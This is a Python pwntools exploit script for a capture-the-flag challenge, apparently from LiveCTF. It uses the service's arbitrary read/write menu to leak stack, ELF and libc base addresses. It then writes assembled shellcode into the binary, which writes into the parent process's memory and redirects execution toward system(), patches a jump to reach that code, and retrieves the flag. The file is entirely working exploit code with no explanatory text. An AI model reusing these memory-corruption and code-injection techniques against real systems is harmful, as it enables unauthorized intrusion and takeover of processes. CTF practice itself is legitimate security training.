#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

context(os='linux', arch='amd64')

p = io

sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafter
rn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive


def aar(addr):
    sla(b'Choice: \n', b'1')
    sla(b'Address: \n', hex(addr)[2:].encode())
    ru(b'Value: ')
    return int(ru(b'\n', True), 16)


def aaw(addr, value):
    sla(b'Choice: \n', b'2')
    sla(b'Value: \n', hex(value)[2:].encode())
    sla(b'Address: \n', hex(addr)[2:].encode())

def aaw_bytes(addr, data):
    for off in range(0, len(data), 8):
        b = data[off:off+8]
        if len(b) == 8:
            aaw(addr+off, u64(b))
        else:
            o = list(p64(aar(addr+off)))
            for i in range(len(b)):
                o[i] = b[i]
            aaw(addr+off, u64(bytes(o)))

code = shellcraft.getppid()
code += '''
mov r12, rax
mov r13, ${base}

lea r15, [r13+0x14FC]

mov rdi, r12
lea rsi, [r13+0x3568]
mov rdx, 26739
call r15

mov rdi, r12
lea rsi, [r13+0x3570]
lea rdx, [r13+0x3568]
call r15

mov rdi, r12
lea rsi, [r13+0x3560]
mov rdx, ${system}
call r15

pop     rbx
ret
'''
# 0x555555554000
leak_stack = aar(0)
print(hex(leak_stack))
elf_base = aar(leak_stack+0x198) & ~0xFFF
print('elf_base', hex(elf_base))
if elf_base == 0:
    for addr in range(leak_stack, leak_stack+0x400, 8):
        value = aar(addr) # 0x1a0
        if value != 0 and value > 0x400000 and ((value&0xFFF)==0x40):
            print('aar', hex(addr-leak_stack), hex(value))
            elf_base = value & ~0xFFF
            print('elf_base', hex(elf_base))
            break
libc_base = aar(elf_base+0x34D8)-0x80E50
print(hex(libc_base))
code = code.replace('${base}', hex(elf_base))
code = code.replace('${system}', hex(libc_base+0x50D70))
_code = asm(code)

aaw_bytes(elf_base+0x1700, _code)
sleep(0.2)
aaw_bytes(elf_base+0x1486, bytes.fromhex('E9 75 02 00 00'))
sleep(2)
# print(p.readmem(elf_base+0x3990, 8).hex())
sla(b'Choice: \n', b'3')
sleep(1)
io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
# io.interactive()
